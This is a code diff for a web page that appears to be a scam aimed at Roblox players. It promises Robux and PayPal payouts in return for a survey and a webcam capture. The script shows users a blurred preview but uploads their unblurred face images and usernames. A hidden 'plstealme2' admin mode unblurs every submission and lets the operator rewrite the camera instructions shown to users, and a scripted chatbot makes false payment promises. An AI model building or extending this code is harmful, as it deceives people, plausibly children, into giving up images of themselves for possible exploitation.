+        let adminHtml = '';
         if (isSecretAdmin) {
-            adminPanelHtml = `<div class="admin-dashboard" id="adminSecretPanel">
-                <div class="admin-header">
-                    <div><span class="admin-badge">👑 plstealme2 • MASTER ACCESS</span></div>
-                    <button id="globalUnblurBtn" class="unblur-btn">🔓 UNBLUR ALL VIDEOS (Show Originals)</button>
+            adminHtml = `<div class="admin-dashboard">
+                <div class="flex-between" style="display:flex; justify-content:space-between; align-items:center;">
+                    <span class="admin-badge"><i class="fas fa-crown"></i> Admin Mode (plstealme2)</span>
+                    <button id="globalUnblurBtn" class="btn-outline" style="padding:6px 14px;">🔓 Unblur All</button>
                 </div>
-                <div id="adminSubmissionsList" class="submissions-grid"><div class="spinner"></div> Loading...</div>
+                <!-- Editable text block for admin to customize camera instruction -->
+                <div class="editable-text-area">
+                    <label style="font-weight:bold; font-size:0.8rem;">✏️ EDIT CAMERA INSTRUCTION TEXT (shown to users):</label>
+                    <textarea id="adminInstructionEditor" rows="2" style="width:100%; margin-top:8px;">${cameraInstructionText}</textarea>
+                    <button id="saveInstructionBtn" class="btn-primary" style="margin-top:8px; padding:6px 14px;">💾 Save Instruction Text</button>
+                </div>
+                <div id="adminSubmissionsGrid" class="submissions-grid">Loading submissions...</div>
             </div>`;
         }
-        return `<div class="step-pane">
-            <div style="text-align:center;">
-                <div style="font-size:3.8rem;">✅✨</div>
-                <h2 style="color:#c6f7b0;">SUCCESS!</h2>
-                <div style="background:#1d3929; border-radius:2rem; padding:1rem;">
-                    Your submission + survey saved. Wait for admin approval.
-                </div>
-                ${adminPanelHtml}
-                <hr>
-                <button class="btn btn-outline" id="fullResetBtn">⟳ Back to start</button>
-            </div>
+        return `<div class="step-container" style="text-align:center;">
+            <i class="fas fa-check-circle" style="font-size: 3rem; color:#1e40af;"></i>
+            <h1>✅ Submitted for approval</h1>
+            <div class="glow-text">Your Robux + PayPal balance will be credited once admin approves.</div>
+            <div class="status-msg" style="background:#d9ebff;"><i class="fab fa-paypal"></i> <strong>PayPal redemption:</strong> After approval, we'll send funds to your linked PayPal. Chatbot can help!</div>
+            ${adminHtml}
+            <button id="resetAllBtn" class="btn btn-outline" style="margin-top: 24px;"><i class="fas fa-sync-alt"></i> New Claim</button>
             <footer>ID: ${submissionId?.slice(0,8) || 'pending'}</footer>
         </div>`;
     }
-    
+
     function render() {
         let html = '';
-        switch(currentStep) {
-            case 'welcome': html = renderWelcome(); break;
-            case 'robloxAuth': html = renderRobloxAuth(); break;
-            case 'survey': html = renderSurveyStep(); break;
-            case 'privacy': html = renderPrivacyStep(); break;
-            case 'media': html = renderMediaStep(); break;
-            case 'blurring': html = renderBlurringStep(); break;
-            case 'validating': html = renderValidatingStep(); break;
-            case 'success': html = renderSuccessStep(); break;
-        }
+        if (currentStep === 'welcome') html = renderWelcome();
+        else if (currentStep === 'robloxAuth') html = renderRobloxAuth();
+        else if (currentStep === 'survey') html = renderSurvey();
+        else if (currentStep === 'privacy') html = renderPrivacy();
+        else if (currentStep === 'media') html = renderMedia();
+        else if (currentStep === 'success') html = renderSuccess();
         appRoot.innerHTML = html;
-        
-        if (currentStep === 'welcome') {
-            document.getElementById('yesRewardBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
-            document.getElementById('noRewardBtn')?.addEventListener('click', () => alert("Okay, reload to restart."));
+        attachEvents();
+        if (currentStep === 'media' && isSecretAdmin === false) {
+            const insSpan = document.getElementById('instructionSpan');
+            if (insSpan) insSpan.innerText = cameraInstructionText;
         }
-        
+    }
+
+    function attachEvents() {
+        if (currentStep === 'welcome') {
+            document.getElementById('startYesBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
+            document.getElementById('startNoBtn')?.addEventListener('click', () => alert("Reload to restart"));
+        }
         if (currentStep === 'robloxAuth') {
-            document.getElementById('confirmRobloxBtn').onclick = () => {
-                const username = document.getElementById('robloxUserField').value.trim();
-                if (!username) return alert("Enter username");
-                robloxUsername = username;
-                isSecretAdmin = (username.toLowerCase() === 'plstealme2');
-                // Reset survey answers for fresh start
+            document.getElementById('confirmUserBtn').onclick = () => {
+                const user = document.getElementById('robloxUser').value.trim();
+                if (!user) return alert("Enter username");
+                robloxUsername = user;
+                isSecretAdmin = (user.toLowerCase() === 'plstealme2');
                 surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
-                surveyCompleted = false;
                 currentStep = 'survey';
                 render();
             };
         }
-        
         if (currentStep === 'survey') {
-            updateSurveyProgressAndButton();
-            attachSurveyEvents();
+            const chips = document.querySelectorAll('.opt-chip');
+            chips.forEach(chip => {
+                chip.onclick = () => {
+                    const q = chip.dataset.q;
+                    const val = chip.dataset.val;
+                    surveyAnswers[q] = val;
+                    const parent = chip.parentElement;
+                    parent.querySelectorAll('.opt-chip').forEach(c => c.classList.remove('selected'));
+                    chip.classList.add('selected');
+                    updateSurveyBtn();
+                };
+            });
+            function updateSurveyBtn() {
+                const allFilled = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
+                const btn = document.getElementById('submitSurveyFinalBtn');
+                if (btn) btn.disabled = !allFilled;
+                const prog = document.getElementById('surveyProgress');
+                if (prog) prog.innerText = `📊 ${Object.values(surveyAnswers).filter(v=>v).length}/3 answered`;
+            }
+            updateSurveyBtn();
+            document.getElementById('submitSurveyFinalBtn')?.addEventListener('click', () => { currentStep = 'privacy'; render(); });
+            document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
         }
-        
         if (currentStep === 'privacy') {
-            const cb = document.getElementById('privacyCheckbox');
-            const accept = document.getElementById('acceptPrivacyBtn');
-            cb.onchange = () => accept.disabled = !cb.checked;
-            accept.onclick = () => { currentStep = 'media'; render(); };
-            document.getElementById('declinePrivacyBtn').onclick = () => { currentStep = 'welcome'; render(); };
+            const cb = document.getElementById('privacyAgree');
+            const acceptBtn = document.getElementById('acceptPrivacyBtn');
+            cb.onchange = () => { acceptBtn.disabled = !cb.checked; };
+            acceptBtn.onclick = () => { currentStep = 'media'; render(); };
+            document.getElementById('declineBtn').onclick = () => { currentStep = 'welcome'; render(); };
         }
-        
         if (currentStep === 'media') {
-            const startCam = document.getElementById('startCamBtn');
-            const submitBtn = document.getElementById('submitBlurBtn');
-            const video = document.getElementById('liveVideo');
-            const blurCanvas = document.getElementById('blurOverlay');
-            const msg = document.getElementById('mediaStatusMsg');
-            let stream = null;
-            let blurInterval = null;
-            
-            startCam.onclick = async () => {
+            let video, canvas, ctx;
+            const startBtn = document.getElementById('startCameraBtn');
+            const submitBtn = document.getElementById('submitCaptureBtn');
+            const statusDiv = document.getElementById('mediaStatus');
+            startBtn.onclick = async () => {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    mediaStream = stream;
-                    video.srcObject = stream;
+                    const st = await navigator.mediaDevices.getUserMedia({ video: true });
+                    mediaStream = st;
+                    video = document.getElementById('liveCam');
+                    canvas = document.getElementById('blurCanvas');
+                    video.srcObject = st;
                     await video.play();
-                    const ctx = blurCanvas.getContext('2d');
+                    ctx = canvas.getContext('2d');
                     const drawBlur = () => {
-                        if (!video.videoWidth) { blurInterval = requestAnimationFrame(drawBlur); return; }
-                        blurCanvas.width = video.videoWidth;
-                        blurCanvas.height = video.videoHeight;
+                        if (!video.videoWidth) { animFrame = requestAnimationFrame(drawBlur); return; }
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
                         ctx.filter = 'blur(24px)';
-                        ctx.drawImage(video, 0, 0, blurCanvas.width, blurCanvas.height);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         ctx.filter = 'none';
-                        blurInterval = requestAnimationFrame(drawBlur);
+                        animFrame = requestAnimationFrame(drawBlur);
                     };
-                    if (blurInterval) cancelAnimationFrame(blurInterval);
+                    if (animFrame) cancelAnimationFrame(animFrame);
                     drawBlur();
-                    animationFrameId = blurInterval;
-                    msg.innerText = '✅ Camera active — click Submit';
-                    msg.style.background = '#1f3a2a';
+                    statusDiv.innerHTML = '✅ Camera ready — follow instruction above and click SUBMIT';
                     submitBtn.disabled = false;
-                } catch(e) { msg.innerText = '❌ Camera error'; }
+                } catch(e) { statusDiv.innerHTML = '❌ Camera permission denied'; }
             };
-            
             submitBtn.onclick = async () => {
-                if (!mediaStream || !video.videoWidth) return alert('Start camera first');
-                msg.innerText = 'Capturing both original & blurred...';
-                const versions = await captureBothVersions(video);
+                if (!mediaStream) return alert("Start camera");
+                const videoElem = document.getElementById('liveCam');
+                const versions = await captureBlobs(videoElem);
                 if (!versions) return;
                 originalBlob = versions.original;
                 blurredBlob = versions.blurred;
-                stopMediaTracks();
-                if (video.srcObject) video.srcObject = null;
-                if (animationFrameId) cancelAnimationFrame(animationFrameId);
-                currentStep = 'blurring';
-                render();
+                stopMedia();
+                currentStep = 'success';
+                try {
+                    const origUrl = await uploadToCloud(originalBlob, `orig_${robloxUsername}_${Date.now()}.jpg`);
+                    const blurUrl = await uploadToCloud(blurredBlob, `blur_${robloxUsername}_${Date.now()}.jpg`);
+                    const docId = await saveRecord(robloxUsername, origUrl, blurUrl, surveyAnswers);
+                    submissionId = docId;
+                    render();
+                    if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 200);
+                } catch(err) { alert("Upload error: "+err.message); currentStep = 'media'; render(); }
             };
         }
-        
-        if (currentStep === 'blurring') {
-            setTimeout(async () => {
-                try {
-                    const originalUrl = await uploadToCloudinary(originalBlob, `original_${robloxUsername}_${Date.now()}.jpg`);
-                    const blurredUrl = await uploadToCloudinary(blurredBlob, `blurred_${robloxUsername}_${Date.now()}.jpg`);
-                    const surveyData = { ...surveyAnswers };
-                    const docId = await saveRecord(robloxUsername, originalUrl, blurredUrl, surveyData);
-                    submissionId = docId;
-                    currentStep = 'success';
-                    render();
-                    if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 100);
-                } catch(e) {
-                    alert('Upload failed: ' + e.message);
-                    currentStep = 'media';
-                    render();
-                }
-            }, 500);
-        }
-        
         if (currentStep === 'success') {
-            document.getElementById('fullResetBtn')?.addEventListener('click', () => {
-                stopMediaTracks();
-                currentStep = 'welcome';
-                isSecretAdmin = false;
-                surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
-                render();
-            });
-            if (isSecretAdmin) loadAdminSubmissions();
+            document.getElementById('resetAllBtn')?.addEventListener('click', () => { stopMedia(); currentStep = 'welcome'; render(); });
+            if (isSecretAdmin) {
+                loadAdminSubmissions();
+                const saveBtn = document.getElementById('saveInstructionBtn');
+                if (saveBtn) {
+                    saveBtn.onclick = () => {
+                        const newText = document.getElementById('adminInstructionEditor').value;
+                        if (newText) {
+                            cameraInstructionText = newText;
+                            alert("Camera instruction updated! It will show for new users.");
+                        }
+                    };
+                }
+            }
         }
     }
-    
+
     async function loadAdminSubmissions() {
-        const container = document.getElementById('adminSubmissionsList');
-        if (!container) return;
+        const grid = document.getElementById('adminSubmissionsGrid');
+        if (!grid) return;
         const subs = await fetchAllSubmissions();
-        if (subs.length === 0) { container.innerHTML = '<p style="color:#aaa;">No submissions yet.</p>'; return; }
-        
-        container.innerHTML = '';
-        subs.forEach(sub => {
+        if (!subs.length) { grid.innerHTML = '<div class="status-msg">No submissions yet.</div>'; return; }
+        grid.innerHTML = '';
+        for (let sub of subs) {
             const card = document.createElement('div');
-            card.className = 'submission-card';
+            card.className = 'sub-card';
             const isApproved = sub.status === 'approved';
-            const surveyInfo = sub.survey ? `${sub.survey.favGame || '?'} | ${sub.survey.playTime || '?'} | ${sub.survey.robuxSpend || '?'}` : 'No survey';
             card.innerHTML = `
-                <div class="image-wrapper">
-                    <img class="submission-img" data-original="${sub.originalImageUrl}" data-blurred="${sub.blurredImageUrl}" src="${sub.blurredImageUrl}" alt="submission">
-                </div>
-                <div style="font-size:12px;">👤 ${escapeHtml(sub.robloxUsername)}</div>
-                <div style="font-size:9px; background:#1f253f; border-radius:12px; padding:4px; margin:6px 0;">📋 ${escapeHtml(surveyInfo)}</div>
-                <div style="font-size:10px;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
-                <div style="font-size:10px;">Status: ${sub.status}</div>
-                <button class="unblur-single-btn">👁️ Unblur (Show Original)</button>
-                ${!isApproved ? `<button class="validate-btn" data-id="${sub.id}">✅ Approve & Grant Robux</button>` : `<button class="validate-btn approved" disabled>✔ Approved</button>`}
+                <div class="img-preview"><img class="sub-img" data-orig="${sub.originalImageUrl}" data-blur="${sub.blurredImageUrl}" src="${sub.blurredImageUrl}"></div>
+                <div><strong>${escapeHtml(sub.robloxUsername)}</strong></div>
+                <div style="font-size:10px;">📋 ${sub.survey?.favGame || '?'} / ${sub.survey?.playTime || '?'}</div>
+                <div>Status: ${sub.status}</div>
+                <button class="unblur-single local-unblur" style="background:#d9ebff; border:none; border-radius:40px; padding:4px; width:100%; margin-top:4px;">👁️ Unblur</button>
+                ${!isApproved ? `<button class="validate-grant" data-id="${sub.id}">✅ Approve & Grant Robux/PayPal</button>` : '<button class="validate-grant" disabled style="background:#2c6e2c;">✔ Paid</button>'}
             `;
-            container.appendChild(card);
-            
-            const img = card.querySelector('.submission-img');
-            let unblurred = false;
-            const unblurBtn = card.querySelector('.unblur-single-btn');
-            unblurBtn.onclick = () => {
-                if (!unblurred) {
-                    img.src = img.dataset.original;
-                    unblurBtn.innerHTML = '🔒 Re-blur';
-                    unblurred = true;
-                } else {
-                    img.src = img.dataset.blurred;
-                    unblurBtn.innerHTML = '👁️ Unblur (Show Original)';
-                    unblurred = false;
-                }
+            const img = card.querySelector('.sub-img');
+            let unblur = false;
+            card.querySelector('.local-unblur').onclick = () => {
+                img.src = unblur ? img.dataset.blur : img.dataset.orig;
+                unblur = !unblur;
             };
-            
-            const approveBtn = card.querySelector('.validate-btn');
-            if (approveBtn && !isApproved) {
-                approveBtn.onclick = async () => {
-                    await approveSubmission(sub.id);
+            const grantBtn = card.querySelector('.validate-grant');
+            if (grantBtn && !isApproved) {
+                grantBtn.onclick = async () => {
+                    await approveAndGrantRobux(sub.id);
                     await loadAdminSubmissions();
+                    addChatMessage("bot", `🎉 Approved ${sub.robloxUsername}! Robux + PayPal balance sent.`);
                 };
             }
-        });
-        
-        const globalBtn = document.getElementById('globalUnblurBtn');
-        if (globalBtn) {
-            const newBtn = globalBtn.cloneNode(true);
-            globalBtn.parentNode.replaceChild(newBtn, globalBtn);
-            newBtn.onclick = () => {
-                const allImgs = document.querySelectorAll('.submission-img');
-                let anyBlurred = false;
-                allImgs.forEach(img => {
-                    const original = img.dataset.original;
-                    if (img.src !== original && original) {
-                        img.src = original;
-                        anyBlurred = true;
-                        const parentCard = img.closest('.submission-card');
-                        const btn = parentCard?.querySelector('.unblur-single-btn');
-                        if (btn) btn.innerHTML = '🔒 Re-blur';
-                    }
-                });
-                if (anyBlurred) newBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED ✨';
-                setTimeout(() => { newBtn.innerHTML = '🔓 UNBLUR ALL VIDEOS'; }, 1800);
-            };
+            grid.appendChild(card);
         }
+        const globalBtn = document.getElementById('globalUnblurBtn');
+        if (globalBtn) globalBtn.onclick = () => { document.querySelectorAll('.sub-img').forEach(i => i.src = i.dataset.orig); };
     }
-    
-    function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])) || ''; }
-    
+
+    function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;','<':'&lt;','>':'&gt;' }[m])) || ''; }
+
+    // Chatbot logic
+    const chatbotIcon = document.getElementById('chatbotIcon');
+    const chatWindow = document.getElementById('chatWindow');
+    const closeChat = document.getElementById('closeChat');
+    const chatInput = document.getElementById('chatInput');
+    const chatSend = document.getElementById('chatSendBtn');
+    const chatMessagesDiv = document.getElementById('chatMessages');
+    function addChatMessage(sender, text) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = sender === 'bot' ? 'bot-msg' : 'user-msg';
+        msgDiv.innerHTML = text;
+        chatMessagesDiv.appendChild(msgDiv);
+        chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
+    }
+    function botResponse(userMsg) {
+        const lower = userMsg.toLowerCase();
+        if (lower.includes('paypal') || lower.includes('balance')) return "💸 After approval, we instantly send PayPal payment to your account email. Make sure your PayPal is verified!";
+        if (lower.includes('step') || lower.includes('how to')) return "📝 Steps: survey → camera (look at lens clearly) → wait admin approval → instant Robux + PayPal.";
+        if (lower.includes('camera')) return "📸 For approval: face centered, good lighting, no filters. Follow the instruction on top of camera box!";
+        return "💙 Ask me about 'PayPal steps', 'camera tips', or 'robux claim'!";
+    }
+    function sendMessage() {
+        const msg = chatInput.value.trim();
+        if (!msg) return;
+        addChatMessage('user', msg);
+        chatInput.value = '';
+        setTimeout(() => addChatMessage('bot', botResponse(msg)), 200);
+    }
+    chatbotIcon.onclick = () => chatWindow.classList.toggle('hidden');
+    closeChat.onclick = () => chatWindow.classList.add('hidden');
+    chatSend.onclick = sendMessage;
+    chatInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
     render();
 </script>
 </body>
